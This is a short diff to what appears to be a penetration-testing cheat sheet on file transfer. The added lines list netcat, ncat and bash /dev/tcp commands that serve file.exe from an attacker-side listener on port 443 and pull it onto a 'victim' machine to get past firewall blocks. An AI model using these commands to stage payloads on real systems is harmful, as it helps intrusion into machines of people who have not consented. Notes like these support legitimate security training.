@@ -19,7 +19,14 @@ ncat --send-only <ip> 8000 < file.exe
 ```
 This can be done in reverse (eg. file wall blocks above):
 ```bash
+# 1. [On local] Start a server
+sudo nc -l -p 443 -q 0 < file.exe
+sudo ncat -l -p 443 --send-only < file.exe
 
+# 2. [On victim] Recieve file
+nc <ip> 443 > file.exe
+ncat <ip> 443 --recv-only > file.exe
+cat < /dev/tcp/<ip>/443 > file.exe
 ```
 ## Through Code
 ![[File Transfer Through Code]]
